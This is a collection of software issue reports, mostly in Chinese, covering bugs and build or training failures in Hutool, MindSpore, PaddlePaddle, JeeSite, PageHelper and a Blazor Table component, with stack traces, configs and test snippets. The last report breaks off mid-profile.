"使用public static void readBySax(String path, int sheetIndex, RowHandler rowHandler)读取数据中有重复列","使用的JDK版本和Hutool版本 jdk1.8 &lt;hutool.version&gt;4.5.6&lt;/hutool.version&gt; &lt;poi.version&gt;3.17&lt;/poi.version&gt; 读出的列有重复项,将excel另存为或者做任意修改保存后重试读取到的结果恢复正常 excel是通过以下方法生成 如果更改为 生成同样数据excel在使用readBySax测试时读取到的数据也是正常的   <code>: public static BigExcelWriter getBigWriter(String destFilePath, String sheetName) public static ExcelWriter getWriter(String destFilePath, String sheetName)"
搜索栏收缩时，已经选择了值的联动字典自定义搜索项会清空【2.9.0版本】,"自定义搜索栏 搜索栏收缩时，已经选择了值的联动字典搜索项会清空。使用tree-input组件   <code>: &lt;template slot-scope=""{disabled,size}"" slot=""ownerSearch""&gt; &lt;/template&gt;"
[MS][NET][deepspeech2][GPU 8p]network train failed,": /device gpu : -- MindSpore version :commit_id: ebc8874b -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_ms_deepspeech2_check_loss_8p.py get code from model_zoo python train.py 网络训练过程发生coredumped 网络训练成功 deepspeech2 网络训练过程发生coredumped   <code>: [&lt;mindspore.train.callback._time_monitor.TimeMonitor object at 0x7f51680c1090&gt;, &lt;mindspore.train.callback._loss_monitor.LossMonitor object at 0x7f51680c13d0&gt;] [&lt;mindspore.train.callback._time_monitor.TimeMonitor object at 0x7fbdfeeeb0d0&gt;, &lt;mindspore.train.callback._loss_monitor.LossMonitor object at 0x7fbdfee63390&gt;, &lt;src.eval_callback.SaveCallback object at 0x7fbdfee63450&gt;] [10-90-54-164:18615] *** Process received signal *** [10-90-54-164:18615] Signal: Segmentation fault (11) [10-90-54-164:18615] Signal code: (128) [10-90-54-164:18615] Failing at address: (nil) [10-90-54-164:18615] [ 0] /lib/x86_64-linux-gnu/libpthread.so.0(+0x12980)[0x7f5297f85980] [10-90-54-164:18615] [ 1] python(_PyObject_LookupAttr+0x59)[0x556bde6294b9] [10-90-54-164:18615] [ 2] python(+0x1e911b)[0x556bde6ed11b] [10-90-54-164:18615] [ 3] python(+0x1edb8d)[0x556bde6f1b8d] [10-90-54-164:18615] [ 4] python(_PyObject_RealIsSubclass+0x38)[0x556bde633688] [10-90-54-164:18615] [ 5] python(_PyMethodDescr_FastCallKeywords+0x2e)[0x556bde66ec4e] [10-90-54-164:18615] [ 6] python(_PyEval_EvalFrameDefault+0x4c7b)[0x556bde6d3e6b] [10-90-54-164:18615] [ 7] python(_PyFunction_FastCallKeywords+0xfb)[0x556bde6671ab] [10-90-54-164:18615] [ 8] python(_PyEval_EvalFrameDefault+0x416)[0x556bde6cf606] [10-90-54-164:18615] [ 9] python(_PyEval_EvalCodeWithName+0x2f9)[0x556bde6171b9] [10-90-54-164:18615] [10] python(_PyFunction_FastCallKeywords+0x325)[0x556bde6673d5] [10-90-54-164:18615] [11] python(_PyEval_EvalFrameDefault+0x416)[0x556bde6cf606] [10-90-54-164:18615] [12] python(_PyEval_EvalCodeWithName+0x2f9)[0x556bde6171b9] [10-90-54-164:18615] [13] python(_PyFunction_FastCallKeywords+0x325)[0x556bde6673d5] [10-90-54-164:18615] [14] python(_PyEval_EvalFrameDefault+0x416)[0x556bde6cf606] [10-90-54-164:18615] [15] python(_PyEval_EvalCodeWithName+0x2f9)[0x556bde6171b9] [10-90-54-164:18615] [16] python(_PyFunction_FastCallKeywords+0x325)[0x556bde6673d5] [10-90-54-164:18615] [17] python(_PyEval_EvalFrameDefault+0x416)[0x556bde6cf606] [10-90-54-164:18615] [18] python(_PyEval_EvalCodeWithName+0x2f9)[0x556bde6171b9] [10-90-54-164:18615] [19] python(_PyFunction_FastCallKeywords+0x325)[0x556bde6673d5] [10-90-54-164:18615] [20] python(_PyEval_EvalFrameDefault+0x416)[0x556bde6cf606] [10-90-54-164:18615] [21] python(_PyEval_EvalCodeWithName+0x2f9)[0x556bde6171b9] [10-90-54-164:18615] [22] python(_PyFunction_FastCallKeywords+0x325)[0x556bde6673d5] [10-90-54-164:18615] [23] python(_PyEval_EvalFrameDefault+0x416)[0x556bde6cf606] [10-90-54-164:18615] [24] python(_PyEval_EvalCodeWithName+0xab8)[0x556bde617978] [10-90-54-164:18615] [25] python(_PyFunction_FastCallDict+0x1d5)[0x556bde6182a5] [10-90-54-164:18615] [26] python(_PyEval_EvalFrameDefault+0x1f3a)[0x556bde6d112a] [10-90-54-164:18615] [27] python(_PyEval_EvalCodeWithName+0x2f9)[0x556bde6171b9] [10-90-54-164:18615] [28] python(_PyFunction_FastCallKeywords+0x325)[0x556bde6673d5] [10-90-54-164:18615] [29] python(_PyEval_EvalFrameDefault+0x416)[0x556bde6cf606] [10-90-54-164:18615] *** End of error message *** -------------------------------------------------------------------------- Primary job terminated normally, but 1 process returned a non-zero exit code. Per user-direction, the job has been aborted. -------------------------------------------------------------------------- -------------------------------------------------------------------------- mpirun noticed that process rank 7 with PID 0 on node 10-90-54-164 exited on signal 11 (Segmentation fault)."
jeesite4.0多数据源配置项目启动报错,"配置多数据源yml文件如下，总共配置了两次，因为不知道怎么配置才是正确的。所以只有各种尝试。 第一种配置方案如下： 以下是尝试第二种配置方案： 两种配置方案试过之后依然不行，哪位大神遇到过同样的问题麻烦给小弟指点下迷津。感激不尽！ 加粗部分是报错的根源 |_ <em>| / __'(</em>)<em>| |</em> / | _ | | __ __ ___ | |_ <em>| __ / /| | ( .| |//\ <em>)| | | |</em> /\ / /</em>| |_ _|_<em>._</em>.|___<em>|</em>| _)_<em>.(</em>___ <em>| :: JeeSite V4.1.3 :: ======================================|</em>|========================== =================================================================== 03-12 16:46:16.146 [32mINFO [0;39m [36m[o.s.b.w.embedded.tomcat.TomcatWebServer][0;39m - Tomcat initialized with port(s): 8080 (http) 03-12 16:46:16.341 [33mWARN [0;39m [36m[c.j.common.datasource.RoutingDataSource][0;39m - Set default target data source is null . 03-12 16:46:18.778 [32mDEBUG[0;39m [36m[com.jeesite.common.beetl.BeetlUtils ][0;39m - Beetl config files: [classpath:/config/beetl-core.properties, classpath:/config/beetl.properties] 03-12 16:46:18.912 [32mDEBUG[0;39m [36m[c.j.c.m.m.provider.SelectSqlProvider ][0;39m - 1毫秒: SELECT a.status AS ""status"", a.create_by AS ""createBy"", a.create_date AS ""createDate"", a.update_by AS ""updateBy"", a.update_date AS ""updateDate"", a.remarks AS ""remarks"", a.module_code AS ""moduleCode"", a.module_name AS ""moduleName"", a.description AS ""description"", a.main_class_name AS ""mainClassName"", a.current_version AS ""currentVersion"", a.upgrade_info AS ""upgradeInfo"" FROM js_sys_module a WHERE a.status = #{sqlMap.where#status#EQ1} ORDER BY a.update_date DESC 03-12 16:46:18.919 [33mWARN [0;39m [36m[o.s.b.w.s.c.AnnotationConfigServletWebServerApplicationContext][0;39m - Exception encountered during context initialization - cancelling refresh attempt: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dbUpgrade': Invocation of init method failed; nested exception is org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.exceptions.PersistenceException: Error querying database. Cause: org.springframework.jdbc.CannotGetJdbcConnectionException: Failed to obtain JDBC Connection: Cannot determine target DataSource for lookup key [null] The error may exist in com/jeesite/modules/sys/dao/ModuleDao.java (best guess) The error may involve com.jeesite.modules.sys.dao.ModuleDao.findList The error occurred while executing a query 请问怎么配置多数据源，文档中没有提到。只是yml配置文件中给出示例配置。按照示例配置之后项目启动还报错。有遇到同样问题并完美解决的同学辛苦告诉一下怎么解决的。谢谢了！   <code>: #======================================# #========== Database sttings ==========# #======================================# # 数据库连接 jdbc: # 多数据源名称列表，启用方式：@MyBatisDao(dataSourceName=""ds2"")启用所数据源配置 dataSourceNames: lins,lins_user,lins_account # Mysql 数据库配置，配置默认数据源 lins: type: mysql driver: com.mysql.jdbc.Driver url: jdbc:mysql://192.168.3.31:3306/lins?useSSL=false&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;zeroDateTimeBehavior=convertToNull username: root password: root testSql: SELECT 1 encrypt: username: false password: true pool: init: 1 minIdle: 3 maxActive: 20 # 多数据源配置：lins_user lins_user: type: mysql driver: com.mysql.jdbc.Driver url: jdbc:mysql://192.168.3.31:3306/lins_user?useSSL=false&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;zeroDateTimeBehavior=convertToNull username: root password: root testSql: SELECT 1 encrypt: username: false password: true pool: init: 1 minIdle: 3 maxActive: 20 # 多数据源配置：lins_account lins_account: type: mysql driver: com.mysql.jdbc.Driver url: jdbc:mysql://192.168.3.31:3306/lins_account?useSSL=false&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;zeroDateTimeBehavior=convertToNull username: root password: root testSql: SELECT 1 encrypt: username: false password: true pool: init: 1 minIdle: 3 maxActive: 20 # 数据库连接 jdbc: # Mysql 数据库配置，配置默认数据源 lins: type: mysql driver: com.mysql.jdbc.Driver url: jdbc:mysql://192.168.3.31:3306/lins?useSSL=false&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;zeroDateTimeBehavior=convertToNull username: root password: root testSql: SELECT 1 encrypt: username: false password: true pool: init: 1 minIdle: 3 maxActive: 20 # 多数据源名称列表，启用方式：@MyBatisDao(dataSourceName=""ds2"")启用所数据源配置 dataSourceNames: lins_user,lins_account # 多数据源配置：lins_user lins_user: type: mysql driver: com.mysql.jdbc.Driver url: jdbc:mysql://192.168.3.31:3306/lins_user?useSSL=false&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;zeroDateTimeBehavior=convertToNull username: root password: root testSql: SELECT 1 encrypt: username: false password: true pool: init: 1 minIdle: 3 maxActive: 20 # 多数据源配置：lins_account lins_account: type: mysql driver: com.mysql.jdbc.Driver url: jdbc:mysql://192.168.3.31:3306/lins_account?useSSL=false&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;zeroDateTimeBehavior=convertToNull username: root password: root testSql: SELECT 1 encrypt: username: false password: true pool: init: 1 minIdle: 3 maxActive: 20 欢迎使用 V4.1.3 您当前的版本为社区版，官方网站：http://jeesite.com 机器码是：cb829e887097ba272b48cc107ebed314 产品名称： 公司名称："
"查询数据库时提示 IndexOutOfBoundsException: Index: 0, Size: 0 错误","PageHelper：4.1.2 MyBatis：3.3.0 MyBatis-Spring：1.2.4 调用代码如下： example.setOrderByClause(orderBy); PageHelper.startPage(page, pageSize); return openRankMapper.selectByExample(example); 错误日志： Error querying database. Cause: java.lang.IndexOutOfBoundsException: Index: 0, Size: 0 The error may exist in class path resource [com/xxxx/calculate/db/mapper/TInviteOpenRankMapper.xml] The error may involve com.xxxx.calculate.db.mapper.TInviteOpenRankMapper.selectByExample_COUNT The error occurred while handling results SQL: SELECT count(0) FROM t_invite_open_rank WHERE (activity_id = ?) Cause: java.lang.IndexOutOfBoundsException: Index: 0, Size: 0 Caused by: java.lang.IndexOutOfBoundsException: Index: 0, Size: 0 at java.util.ArrayList.rangeCheck(ArrayList.java:571) ~[na:1.6.0_22] at java.util.ArrayList.get(ArrayList.java:349) ~[na:1.6.0_22] at com.github.pagehelper.SqlUtil.doProcessPage(SqlUtil.java:481) ~[pagehelper-4.1.2.jar!/:na] at com.github.pagehelper.SqlUtil._processPage(SqlUtil.java:407) ~[pagehelper-4.1.2.jar!/:na] at com.github.pagehelper.SqlUtil.processPage(SqlUtil.java:374) ~[pagehelper-4.1.2.jar!/:na] at com.github.pagehelper.PageHelper.intercept(PageHelper.java:254) ~[pagehelper-4.1.2.jar!/:na] at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:61) ~[mybatis-3.3.0.jar!/:3.3.0] at $Proxy66.query(Unknown Source) ~[na:na] at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:120) ~[mybatis-3.3.0.jar!/:3.3.0] ... 23 common frames omitted   <code>: at org.apache.ibatis.exceptions.ExceptionFactory.wrapException(ExceptionFactory.java:30) ~[mybatis-3.3.0.jar!/:3.3.0] at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:122) ~[mybatis-3.3.0.jar!/:3.3.0] at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:113) ~[mybatis-3.3.0.jar!/:3.3.0] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.6.0_22] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) ~[na:1.6.0_22] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.6.0_22] at java.lang.reflect.Method.invoke(Method.java:616) ~[na:1.6.0_22] at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:408) ~[mybatis-spring-1.2.4.jar!/:1.2.4] ... 17 common frames omitted"
编译C  预测模型TensorRT报错,"编译C++预测模型TensorRT报错： error: ‘class nvinfer1::IPluginFactory’ has virtual functions and accessible non-virtual destructor [-Werror=non-virtual-dtor] 环境配置： GIT COMMIT ID: 12f64401aaef8d7a5a74e5098d89d2b1071a7a9d WITH_MKL: ON WITH_MKLDNN: ON WITH_GPU: ON CUDA version: 10.1 CUDNN version: v7 WITH_TENSORRT: ON System: Ubuntu 16.04，x86_64 Python version: 3.6.1 CUDA version: 10.1.243 cuDNN version: 7.6.5 Nvidia driver version: 418.87.00 TensorRT version: 6.0.1.5 (TensorRT-6.0.1.5.Ubuntu-16.04.x86_64-gnu.cuda-10.1.cudnn7.6.tar.gz) 报错信息： 提示纯虚类缺少虚析构函数，手动为其补充虚析构函数后编译通过，但使用预测库时链接报错： /home/tao/work/deep_learning/paddle-cpp/paddle/install_trt/paddle/lib/libpaddle_fluid.so: undefined reference to `nvinfer1::IPluginFactory::~IPluginFactory()' collect2: error: ld returned 1 exit status CMakeFiles/induced_vel_deploy.dir/build.make:111: recipe for target 'induced_vel_deploy' failed make[2]: *** [induced_vel_deploy] Error 1   <code>: In file included from /home/tao/software/TensorRT-6.0.1.5/include/NvInfer.h:53:0, from /home/tao/work/deep_learning/paddle-cpp/paddle/paddle/fluid/platform/dynload/tensorrt.h:16, from /home/tao/work/deep_learning/paddle-cpp/paddle/paddle/fluid/platform/dynload/tensorrt.cc:15: /home/tao/software/TensorRT-6.0.1.5/include/NvInferRuntime.h:329:7: error: ‘class nvinfer1::IDimensionExpr’ has virtual functions and accessible non-virtual destructor [-Werror=non-virtual-dtor] class IDimensionExpr ^ /home/tao/software/TensorRT-6.0.1.5/include/NvInferRuntime.h:925:7: error: ‘class nvinfer1::IPluginFactory’ has virtual functions and accessible non-virtual destructor [-Werror=non-virtual-dtor] class IPluginFactory ^ cc1plus: all warnings being treated as errors paddle/fluid/platform/dynload/CMakeFiles/dynload_cuda.dir/build.make:160: recipe for target 'paddle/fluid/platform/dynload/CMakeFiles/dynload_cuda.dir/tensorrt.cc.o' failed make[2]: *** [paddle/fluid/platform/dynload/CMakeFiles/dynload_cuda.dir/tensorrt.cc.o] Error 1 make[2]: *** Waiting for unfinished jobs...."
fix typo,"fix typo, when run : PaddlePaddle 0.10.0, compiled with with_avx: ON with_gpu: OFF with_mkldnn: @WITH_MKLDNN with_mklml: ON with_double: OFF with_python: ON with_rdma: OFF with_timer: OFF And find another typo in unit test.   <code>: paddle version"
Parallel.Do does not support sparse gradients,"Sample code is here, setting the and can reproduce this problem. Error stacks are:   <code>: with_parallel_do=True sparse_update=True Traceback (most recent call last): File ""/Volumes/unamed/.proj/ChineseWordVectors/cbow_fluid.py"", line 83, in &lt;module&gt; main(window_size=5, batch_size=2048, with_parallel_do=True, sparse_update=True) File ""/Volumes/unamed/.proj/ChineseWordVectors/cbow_fluid.py"", line 76, in main avg_loss_np = exe.run(feed=feeder.feed(data), fetch_list=[avg_loss]) File ""/usr/local/lib/python2.7/site-packages/paddle/v2/fluid/executor.py"", line 178, in run self.executor.run(program.desc, scope, 0, True, True) paddle.v2.fluid.core.EnforceNotMet: Variable must be type N6paddle9framework9LoDTensorE, the holding type is N6paddle9framework12SelectedRowsE at [/Users/baidu/Downloads/.proj/Paddle/paddle/framework/variable.h:32] PaddlePaddle Call Stacks: 0 0x119d19c18p paddle::platform::EnforceNotMet::EnforceNotMet(std::exception_ptr, char const*, int) + 1976 1 0x119d0ae43p paddle::platform::EnforceNotMet::EnforceNotMet(std::exception_ptr, char const*, int) + 35 2 0x11a949d4bp paddle::framework::LoDTensor const&amp; paddle::framework::Variable::Get&lt;paddle::framework::LoDTensor&gt;() const + 635 3 0x11a8d6566p paddle::operators::ParallelDoGradOp::Run(paddle::framework::Scope const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace&gt; const&amp;) const + 4278 4 0x119f15c78p paddle::framework::Executor::Run(paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool) + 5880 5 0x119df05e2p pybind11::cpp_function::cpp_function&lt;void, paddle::framework::Executor, paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool, pybind11::name, pybind11::is_method, pybind11::sibling&gt;(void (paddle::framework::Executor::*)(paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool), pybind11::name const&amp;, pybind11::is_method const&amp;, pybind11::sibling const&amp;)::'lambda'(paddle::framework::Executor*, paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool)::operator()(paddle::framework::Executor*, paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool) const + 194 6 0x119df0508p pybind11::detail::argument_loader&lt;paddle::framework::Executor*, paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool&gt;::call_impl&lt;void, pybind11::cpp_function::cpp_function&lt;void, paddle::framework::Executor, paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool, pybind11::name, pybind11::is_method, pybind11::sibling&gt;(void (paddle::framework::Executor::*)(paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool), pybind11::name const&amp;, pybind11::is_method const&amp;, pybind11::sibling const&amp;)::'lambda'(paddle::framework::Executor*, paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool)&amp;, 0ul, 1ul, 2ul, 3ul, 4ul, 5ul&gt;(void, paddle::framework::Executor&amp;&amp;, pybind11::detail::index_sequence&lt;0ul, 1ul, 2ul, 3ul, 4ul, 5ul&gt;) + 376 7 0x119def785p pybind11::detail::argument_loader&lt;paddle::framework::Executor*, paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool&gt;::call&lt;void, pybind11::cpp_function::cpp_function&lt;void, paddle::framework::Executor, paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool, pybind11::name, pybind11::is_method, pybind11::sibling&gt;(void (paddle::framework::Executor::*)(paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool), pybind11::name const&amp;, pybind11::is_method const&amp;, pybind11::sibling const&amp;)::'lambda'(paddle::framework::Executor*, paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool)&amp;&gt;(std::__1::enable_if&lt;std::is_void&lt;void&gt;::value, pybind11::detail::void_type&gt;::type, paddle::framework::Executor&amp;&amp;) + 37 8 0x119def67bp _ZZN8pybind1112cpp_function10initializeIZNS0_C1IvN6paddle9framework8ExecutorEJRKNS4_11ProgramDescEPNS4_5ScopeEibbEJNS_4nameENS_9is_methodENS_7siblingEEEEMT0_FT_DpT1_EDpRKT2_EUlPS5_S8_SA_ibbE_vJSO_S8_SA_ibbEJSB_SC_SD_EEEvOSF_PFSE_SH_ESN_ENKUlRNS_6detail13function_callEE_clESV_ + 235 9 0x119def578p _ZZN8pybind1112cpp_function10initializeIZNS0_C1IvN6paddle9framework8ExecutorEJRKNS4_11ProgramDescEPNS4_5ScopeEibbEJNS_4nameENS_9is_methodENS_7siblingEEEEMT0_FT_DpT1_EDpRKT2_EUlPS5_S8_SA_ibbE_vJSO_S8_SA_ibbEJSB_SC_SD_EEEvOSF_PFSE_SH_ESN_ENUlRNS_6detail13function_callEE_8__invokeESV_ + 24 10 0x119d60d6ep pybind11::cpp_function::dispatcher(_object*, _object*, _object*) + 5838 11 0x10d1f29a3p PyEval_EvalFrameEx + 27247 12 0x10d1ebd3ep PyEval_EvalCodeEx + 1617 13 0x10d1f645ep fast_function + 117 14 0x10d1f278fp PyEval_EvalFrameEx + 26715 15 0x10d1ebd3ep PyEval_EvalCodeEx + 1617 16 0x10d1f645ep fast_function + 117 17 0x10d1f278fp PyEval_EvalFrameEx + 26715 18 0x10d1ebd3ep PyEval_EvalCodeEx + 1617 19 0x10d1eb6e7p PyEval_EvalCode + 48 20 0x10d20f068p run_mod + 53 21 0x10d20f10bp PyRun_FileExFlags + 133 22 0x10d20ec5cp PyRun_SimpleFileExFlags + 702 23 0x10d220442p Py_Main + 3094 24 0x7fff72d32115p start + 1"
Refine backward no_grad_var handling,"If all the gradient inputs of some are marked as <em>no_gradient</em>, which means all of them can be considered as zeros. For s are in essence the propagation of gradients, all the outputs are definitely zeros when all gradient inputs are zeros. Therefore the can also be skipped.   <code>: grad_op grad_op grad_op"
BigExcelWriter构造器注释问题,JDK版本： openjdk_8_201 hutool版本： 5.7.13 注释这里是不是有问题，BigExcelWriter这个默认生成的是xlsx吧   <code>: /** * 构造，默认生成xls格式的Excel文件&lt;br&gt; * 此构造不传入写出的Excel文件路径，只能调用{@link #flush(java.io.OutputStream)}方法写出到流&lt;br&gt; * 若写出到文件，还需调用{@link #setDestFile(File)}方法自定义写出的文件，然后调用{@link #flush()}方法写出到文件 */ public BigExcelWriter() { this(DEFAULT_WINDOW_SIZE); }
Table组件在数据源改变时，OnQueryAsync无法自动触发,"当ScanRecordEntity数据集合通过外部方法改变时，OnQueryAsync无法自动触发，现在解决方法是当数据集合改变时，手动调用更新：await table.QueryAsync (); 无 组件版本 latest 浏览器 all Server Side Web Assembly   <code>: &lt;Table @ref=""table"" TItem=""ScanRecordEntity"" OnQueryAsync=""@OnQueryAsync""&gt;"
[ModelZoo] YOLOv3_resnet18模型修改backbone网络num_classes参数后训练失败,": /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : Docker容器 -- GCC/Compiler version : 本地使用VOC2007数据集进行ModelZoo里YOLOv3_resnet18网络训练，在修改网络训练脚本过程中发现如下问题： 根据yolov3.py脚本中ResNet结构体的定义（详见此处），用于表示网络的分类数，同时在构图方法中，num_classes参数用于区分训练和推理场景的标识符 但是由于该网络在YOLOv3模型中作为backbone结构，后续的FC操作均需跳过；如果用户将置为非空，则会导致最后输出的feature map被降为2维，这就导致在后续传入YOLO Block结构中的Conv2d算子处理过程中运行失败 建议通过如下两种途径解决该问题： 将参数去掉，同时修改ResNet结构去掉FC等操作 添加参数，取代用于区分训练和推理场景的标识符 修改yolov3.py源码，将设置为非空 按照文档要求配置脚本 执行启动训练进程 执行之后出现如下报错：   <code>: v1.1.1 v3.7.5 num_classes construct num_classes num_classes is_training num_classes num_classes default_config.yaml python train.py Traceback (most recent call last): File ""train.py"", line 200, in &lt;module&gt; run_train() File ""/dataset/mindspore/model_zoo/official/cv/yolov3_resnet18/model_utils/moxing_adapter.py"", line 105, in wrapped_func run_func(*args, **kwargs) File ""train.py"", line 197, in run_train model.train(default_config.epoch_size, dataset, callbacks=callback, dataset_sink_mode=dataset_sink_mode) File ""/usr/local/lib/python3.7/dist-packages/mindspore/train/model.py"", line 592, in train sink_size=sink_size) File ""/usr/local/lib/python3.7/dist-packages/mindspore/train/model.py"", line 385, in _train self._train_process(epoch, train_dataset, list_callback, cb_params) File ""/usr/local/lib/python3.7/dist-packages/mindspore/train/model.py"", line 513, in _train_process outputs = self._train_network(*next_element) File ""/usr/local/lib/python3.7/dist-packages/mindspore/nn/cell.py"", line 351, in __call__ output = self.construct(*cast_inputs, **kwargs) File ""/dataset/mindspore/model_zoo/official/cv/yolov3_resnet18/src/yolov3.py"", line 672, in construct loss = self.network(*args) File ""/usr/local/lib/python3.7/dist-packages/mindspore/nn/cell.py"", line 351, in __call__ output = self.construct(*cast_inputs, **kwargs) File ""/dataset/mindspore/model_zoo/official/cv/yolov3_resnet18/src/yolov3.py"", line 630, in construct yolo_out = self.yolo_network(x) File ""/usr/local/lib/python3.7/dist-packages/mindspore/nn/cell.py"", line 351, in __call__ output = self.construct(*cast_inputs, **kwargs) File ""/dataset/mindspore/model_zoo/official/cv/yolov3_resnet18/src/yolov3.py"", line 602, in construct big_object_output, medium_object_output, small_object_output = self.feature_map(x) File ""/usr/local/lib/python3.7/dist-packages/mindspore/nn/cell.py"", line 351, in __call__ output = self.construct(*cast_inputs, **kwargs) File ""/dataset/mindspore/model_zoo/official/cv/yolov3_resnet18/src/yolov3.py"", line 367, in construct con1, big_object_output = self.backblock0(feature_map3) File ""/usr/local/lib/python3.7/dist-packages/mindspore/nn/cell.py"", line 351, in __call__ output = self.construct(*cast_inputs, **kwargs) File ""/dataset/mindspore/model_zoo/official/cv/yolov3_resnet18/src/yolov3.py"", line 306, in construct c1 = self.conv0(x) File ""/usr/local/lib/python3.7/dist-packages/mindspore/nn/cell.py"", line 351, in __call__ output = self.construct(*cast_inputs, **kwargs) File ""/usr/local/lib/python3.7/dist-packages/mindspore/nn/layer/container.py"", line 174, in construct input_data = cell(input_data) File ""/usr/local/lib/python3.7/dist-packages/mindspore/nn/cell.py"", line 351, in __call__ output = self.construct(*cast_inputs, **kwargs) File ""/usr/local/lib/python3.7/dist-packages/mindspore/nn/layer/conv.py"", line 253, in construct output = self.conv2d(x, self.weight) File ""/usr/local/lib/python3.7/dist-packages/mindspore/ops/primitive.py"", line 186, in __call__ return _run_op(self, self.name, args) File ""/usr/local/lib/python3.7/dist-packages/mindspore/common/api.py"", line 75, in wrapper results = fn(*arg, **kwargs) File ""/usr/local/lib/python3.7/dist-packages/mindspore/ops/primitive.py"", line 525, in _run_op output = real_run_op(obj, op_name, args) File ""/usr/local/lib/python3.7/dist-packages/mindspore/ops/primitive.py"", line 401, in __infer__ out[track] = fn(*(x[track] for x in args)) File ""/usr/local/lib/python3.7/dist-packages/mindspore/ops/operations/nn_ops.py"", line 1211, in infer_shape validator.check_equal_int(len(x_shape_norm), 4, ""x rank"", self.name) File ""/usr/local/lib/python3.7/dist-packages/mindspore/_checkparam.py"", line 239, in check_equal_int return check_number(arg_value, value, Rel.EQ, int, arg_name, prim_name) File ""/usr/local/lib/python3.7/dist-packages/mindspore/_checkparam.py"", line 147, in check_number raise type_except(f'{arg_name} {prim_name} should be an {arg_type.__name__} and must {rel_str}, ' ValueError: `x rank` in `Conv2D` should be an int and must == 4, but got `2` with type `int`."
"[CT][MS][lognormalreverse] GPU后端，lognormalreverse算子10w，100w，1000w输入，float16,32,64类型均有性能不达标","GPU后端，lognormalreverse算子100w，1000w输入，float16,32,64类型均性能不达标 / 硬件环境: /device /GPU/ : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph def test_log_normal_reverse_100w_float32(): input_x = Tensor(np.random.random((100, 100, 100)).astype(np.float32)) fact = LogNormalReverseMock(inputs=[input_x], attributes={""mean"": 1.0, ""std"": 1.0}) fact.forward_profile_cmp() def test_log_normal_reverse_1000w_float64(): input_x = Tensor(np.random.random((10, 10, 10, 10, 10, 10, 10)).astype(np.float64)) fact = LogNormalReverseMock(inputs=[input_x], attributes={""mean"": 1.0, ""std"": 1.0}) fact.forward_profile_cmp() def test_log_normal_reverse_100w_float16(): input_x = Tensor(np.random.random((100, 100, 100)).astype(np.float16)) fact = LogNormalReverseMock(inputs=[input_x], attributes={""mean"":1.0, ""std"":1.0 }) fact.forward_profile_cmp() float64 1000w [INFO] ME(34552:140004573378368,MainProcess):2022-11-07-14:42:04.200.101 [/home/sunchunchan/MindSporeTest/share/ops/primitive/lognormalreverse_ops.py:143] pytorch profiler: ------------------------------------------------------- ------------ ------------ ------------ ------------ ------------ ------------ ------------ ------------ ------------ ------------ --------------------------------------------- Name Self CPU % Self CPU CPU total % CPU total CPU time avg Self CUDA Self CUDA % CUDA total CUDA time avg # of Calls Input Shapes _ZN2at6native97_GLOBAL__N__73_tmpxft_0000190e_000000... 0.00% 0.000us 0.00% 0.000us 0.000us 1.639ms 23.07% 1.639ms 182.111us 9 [] Self CPU time total: 4.126s Self CUDA time total: 7.104ms [INFO] ME(34552:140004573378368,MainProcess):2022-11-07-14:42:04.200.496 [/home/sunchunchan/MindSporeTest/share/ops/primitive/lognormalreverse_ops.py:168] forward_profile_torch time: 34.4 [INFO] ME(34552:140004573378368,MainProcess):2022-11-07-14:42:04.200.574 [/home/sunchunchan/MindSporeTest/share/ops/primitive/lognormalreverse_ops.py:169] forward_profile_ms time: 2505.46 float64 10w   <code>: cudaGetDeviceCount 0.02% 1.007ms 0.02% 1.007ms 503.500us 0.000us 0.00% 0.000us 0.000us 2 [] cudaGetDeviceProperties 0.01% 311.000us 0.01% 311.000us 155.500us 0.000us 0.00% 0.000us 0.000us 2 [] aten::to 0.00% 56.000us 99.93% 4.123s 4.123s 0.000us 0.00% 5.465ms 5.465ms 1 [[10, 10, 10, 10, 10, 10, 10], [], [], [], [] aten::empty_strided 0.00% 68.000us 99.79% 4.117s 4.117s 0.000us 0.00% 0.000us 0.000us 1 [[], [], [], [], [], []] cudaMalloc 99.79% 4.117s 99.79% 4.117s 4.117s 0.000us 0.00% 0.000us 0.000us 1 [] aten::copy_ 0.00% 72.000us 0.14% 5.698ms 5.698ms 5.465ms 76.93% 5.465ms 5.465ms 1 [[10, 10, 10, 10, 10, 10, 10], [10, 10, 10, 1 cudaMemcpyAsync 0.13% 5.552ms 0.13% 5.552ms 5.552ms 0.000us 0.00% 0.000us 0.000us 1 [] Memcpy HtoD (Pageable 